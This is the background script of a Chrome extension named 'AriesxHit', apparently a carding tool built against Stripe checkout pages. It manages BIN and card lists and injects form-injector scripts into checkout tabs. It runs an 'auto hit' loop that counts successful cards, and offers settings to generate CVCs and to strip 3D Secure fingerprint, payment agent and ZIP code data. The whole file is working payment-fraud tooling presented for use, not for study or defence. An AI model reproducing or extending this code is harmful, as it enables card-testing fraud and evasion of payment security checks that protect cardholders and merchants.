// ===================================
// BACKGROUND.JS
// AriesxHit - No Debugger, Content Script Based
// ===================================

// ==================== STATE ====================

const state = {
  binList: [],
  cardList: [],
  currentBinIndex: 0,
  bypassActive: false,
  autoHitActive: false,
  logs: [],
  stats: { hits: 0, tested: 0, declined: 0 },
  settings: {
    cvcModifier: 'generate',
    customCvc: '',
    remove3dsFingerprint: true,
    removePaymentAgent: false,
    removeZipCode: false
  }
};

// ==================== INIT ====================

chrome.storage.local.get([
  'binList', 'cardList', 'logs', 'stats',
  'settings_cvcModifier', 'settings_customCvc',
  'settings_remove3dsFingerprint', 'settings_removePaymentAgent',
  'settings_removeZipCode'
], (r) => {
  if (r.binList) state.binList = r.binList;
  if (r.cardList) state.cardList = r.cardList;
  if (r.logs) state.logs = r.logs;
  if (r.stats) state.stats = r.stats;
  if (r.settings_cvcModifier) state.settings.cvcModifier = r.settings_cvcModifier;
  if (r.settings_customCvc) state.settings.customCvc = r.settings_customCvc;
  if (r.settings_remove3dsFingerprint !== undefined) state.settings.remove3dsFingerprint = r.settings_remove3dsFingerprint;
  if (r.settings_removePaymentAgent !== undefined) state.settings.removePaymentAgent = r.settings_removePaymentAgent;
  if (r.settings_removeZipCode !== undefined) state.settings.removeZipCode = r.settings_removeZipCode;
  
  addLog('info', '⚡ AriesxHit Ready');
});

// Storage change listener
chrome.storage.onChanged.addListener((changes) => {
  if (changes.binList) state.binList = changes.binList.newValue || [];
  if (changes.cardList) state.cardList = changes.cardList.newValue || [];
  if (changes.settings_cvcModifier) state.settings.cvcModifier = changes.settings_cvcModifier.newValue;
  if (changes.settings_customCvc) state.settings.customCvc = changes.settings_customCvc.newValue;
  if (changes.settings_remove3dsFingerprint) state.settings.remove3dsFingerprint = changes.settings_remove3dsFingerprint.newValue;
});

// ==================== LOGGING ====================

function addLog(type, message) {
  const entry = { type, message, timestamp: Date.now() };
  state.logs.push(entry);
  if (state.logs.length > 500) state.logs.shift();
  chrome.storage.local.set({ logs: state.logs });
  
  // Broadcast to popup
  chrome.runtime.sendMessage({
    type: 'LOG_UPDATE',
    logType: type,
    message: message
  }).catch(() => {});
}

// ==================== TAB MANAGEMENT ====================

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url?.includes('stripe.com') || tab.url?.includes('cs_live') || tab.url?.includes('checkout') || tab.url?.includes('buy.stripe')) {
    // Inject content scripts
    chrome.scripting.executeScript({
      target: { tabId, allFrames: true },
      files: ['scripts/content/stripe-detector.js', 'scripts/content/form-injector.js']
    }).catch(() => {});

    // Send current state to tab
    if (state.bypassActive) {
      setTimeout(() => {
        chrome.tabs.sendMessage(tabId, {
          type: 'SET_BYPASS_STATE',
          active: true,
          bin: state.binList[0] || '',
          settings: state.settings
        }).catch(() => {});
      }, 1000);
    }
  }
});

// ==================== MESSAGE HANDLING ====================

chrome.runtime.onMessage.addListener((msg, sender, respond) => {
  const tabId = sender.tab?.id;

  switch (msg.type) {
    // ===== LOG FROM CONTENT SCRIPT =====
    case 'ADD_LOG_ENTRY':
      addLog(msg.logType, msg.message);
      
      // Update stats
      if (msg.logType === 'trying') {
        state.stats.tested++;
      } else if (msg.logType === 'error') {
        state.stats.declined++;
      } else if (msg.logType === 'success' && msg.message.includes('HIT')) {
        state.stats.hits++;
      }
      chrome.storage.local.set({ stats: state.stats });
      
      respond({ success: true });
      break;

    // ===== BYPASS =====
    case 'START_BYPASS':
      state.bypassActive = true;
      if (msg.data?.bins?.length > 0) {
        state.binList = msg.data.bins;
        state.currentBinIndex = 0;
        chrome.storage.local.set({ binList: state.binList });
      }
      
      addLog('success', `🔓 Bypass ON [CVC: ${state.settings.cvcModifier}]`);
      
      // Notify all tabs
      broadcastToTabs({
        type: 'SET_BYPASS_STATE',
        active: true,
        bin: state.binList[0] || '',
        settings: state.settings
      });
      
      respond({ success: true });
      break;

    case 'STOP_BYPASS':
      state.bypassActive = false;
      addLog('info', '⏹️ Bypass OFF');
      
      broadcastToTabs({
        type: 'SET_BYPASS_STATE',
        active: false,
        bin: '',
        settings: state.settings
      });
      
      respond({ success: true });
      break;

    case 'GET_BYPASS_STATE':
      respond({ active: state.bypassActive });
      break;

    // ===== AUTO HIT =====
    case 'START_AUTO_HIT':
      state.autoHitActive = true;
      state.cardList = msg.data?.cards || [];
      addLog('success', `🚀 Auto Hit ON (${state.cardList.length} cards)`);
      respond({ success: true });
      break;

    case 'STOP_AUTO_HIT':
      state.autoHitActive = false;
      addLog('info', '⏹️ Auto Hit OFF');
      respond({ success: true });
      break;

    case 'GET_AUTO_HIT_STATE':
      respond({ active: state.autoHitActive });
      break;

    // ===== BIN =====
    case 'SET_BIN_LIST':
      state.binList = Array.isArray(msg.bins) ? msg.bins :
        msg.bins.split('\n').map(b => b.trim()).filter(b => b.length >= 6);
      state.currentBinIndex = 0;
      chrome.storage.local.set({ binList: state.binList });
      addLog('info', `📋 ${state.binList.length} BINs loaded`);
      
      // Update tabs
      if (state.bypassActive) {
        broadcastToTabs({
          type: 'UPDATE_BIN',
          bin: state.binList[0] || ''
        });
      }
      
      respond({ success: true });
      break;

    // ===== SETTINGS =====
    case 'UPDATE_SETTINGS':
      Object.assign(state.settings, msg.settings);
      for (const [k, v] of Object.entries(msg.settings)) {
        chrome.storage.local.set({ [`settings_${k}`]: v });
      }
      
      // Update tabs
      broadcastToTabs({
        type: 'UPDATE_SETTINGS',
        settings: state.settings
      });
      
      respond({ success: true });
      break;

    case 'GET_SETTINGS':
      respond({ settings: state.settings });
      break;

    // ===== LOGS =====
    case 'GET_LOGS':
      respond({ logs: state.logs, stats: state.stats });
      break;

    case 'CLEAR_LOGS':
      state.logs = [];
      chrome.storage.local.set({ logs: [] });
      respond({ success: true });
      break;

    case 'GET_STATS':
      respond(state.stats);
      break;

    // ===== CHECKOUT DETECTION =====
    case 'CHECKOUT_DETECTED':
      addLog('info', `🔍 ${(msg.checkoutType || '2d').toUpperCase()} Checkout`);
      respond({ success: true });
      break;

    case '3DS_DETECTED':
      addLog('warning', '🔒 3D Secure Detected');
      respond({ success: true });
      break;

    case 'user_clicked_submit':
      addLog('info', '👆 Submit clicked');
      respond({ success: true });
      break;

    default:
      respond({ error: 'Unknown message type' });
  }

  return true;
});

// ==================== UTILITIES ====================

function broadcastToTabs(message) {
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      chrome.tabs.sendMessage(tab.id, message).catch(() => {});
    });
  });
}

// Extension icon click - open popup
chrome.action.onClicked.addListener(async () => {
  const tabs = await chrome.tabs.query({ url: chrome.runtime.getURL('popup.html') });
  if (tabs.length > 0) {
    chrome.tabs.update(tabs[0].id, { active: true });
    chrome.windows.update(tabs[0].windowId, { focused: true });
  } else {
    const auth = await chrome.storage.local.get(['auth_token', 'user_data']);
    chrome.tabs.create({
      url: chrome.runtime.getURL(auth.auth_token ? 'popup.html' : 'login.html')
    });
  }
});

console.log('[AriesxHit] Background Ready - No Debugger');
